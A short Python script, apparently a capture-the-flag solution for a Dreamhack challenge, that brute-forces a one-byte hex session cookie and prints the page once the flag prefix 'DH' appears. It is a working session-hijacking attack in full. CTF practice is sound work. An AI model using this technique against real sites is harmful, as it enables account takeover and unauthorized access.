import requests 

url = "http://host3.dreamhack.games:20712/"

for i in range(256):
    print(hex(i)[2:])
    cookie = {'sessionid' : hex(i)[2:]}
    r = requests.get(url, cookies=cookie)
    if 'DH' in r.text:
        print(r.text)
        exit()